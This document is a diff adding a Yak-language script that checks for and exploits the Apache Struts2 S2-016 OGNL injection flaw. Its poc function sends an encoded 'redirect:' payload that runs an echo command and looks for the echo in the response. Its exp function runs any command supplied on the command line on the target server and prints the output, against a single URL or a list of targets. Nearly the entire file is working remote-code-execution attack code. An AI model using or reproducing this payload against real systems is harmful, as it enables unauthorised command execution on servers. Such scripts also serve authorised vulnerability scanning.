@@ -1,0 +1,80 @@
+
+def exp(url,cmd){
+    echo_data = str.Join(str.Split(cmd," "),"','")
+    // log.info(random_str)
+    payload = `redirect:%24%7B%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%28new+java.lang.ProcessBuilder(new+java.lang.String[]{'`+ echo_data+`'})).start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23dis%3Dnew+java.io.DataInputStream%28%23b%29%2C%23buf%3Dnew+byte%5B20000%5D%2C%23dis.read%28%23buf%29%2C%23msg%3Dnew+java.lang.String%28%23buf%29%2C%23dis.close%28%29%2C%23resp.getWriter%28%29.println%28%23msg.trim%28%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29%7D=`
+
+    req, err = http.Post(
+            url,
+            http.useragent(http.uarand()),
+            http.header("Content-Type","application/x-www-form-urlencoded"),
+            http.body(payload),
+            )
+    if err != nil {
+        return
+    }
+
+    rsp_data = http.GetAllBody(req)
+    println(string(rsp_data))
+}
+
+def poc(url){
+    loglevel(`debug`)
+
+    random_str = randstr(8)
+    echo_data = str.Join(str.Split("echo " + random_str," "),"','")
+    // log.info(random_str)
+    payload = `redirect:%24%7B%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%28new+java.lang.ProcessBuilder(new+java.lang.String[]{'`+ echo_data+`'})).start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23dis%3Dnew+java.io.DataInputStream%28%23b%29%2C%23buf%3Dnew+byte%5B20000%5D%2C%23dis.read%28%23buf%29%2C%23msg%3Dnew+java.lang.String%28%23buf%29%2C%23dis.close%28%29%2C%23resp.getWriter%28%29.println%28%23msg.trim%28%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29%7D=`
+
+    req, err = http.Post(
+            url,
+            http.useragent(http.uarand()),
+            http.header("Content-Type","application/x-www-form-urlencoded"),
+            http.body(payload),
+            )
+    if err != nil {
+        return
+    }
+
+
+    rsp_data = http.GetAllBody(req)
+    if re.Match(random_str,rsp_data){
+        log.warn(url + " S2_016 found !!!")
+    }else{
+        log.debug(url + " S2_016 safe !!!")
+    }
+
+}
+
+
+
+
+if YAK_MAIN {
+    loglevel("info")
+    u = cli.String("u")
+    file = cli.LineDict("f")
+    cmd = cli.String("cmd")
+
+    if u == "" && len(file)<1 {
+        log.info("you need input target -u or -f")
+        return
+    }
+
+    if u != ""{
+        if cmd != ""{
+            exp(u,cmd)
+        }else{
+            poc(u)
+        }
+        return
+    }
+
+    for _,u = range file {
+         if cmd != "" {
+            exp(u,cmd)
+        }else{
+            poc(u)
+        }
+    }
+
+}
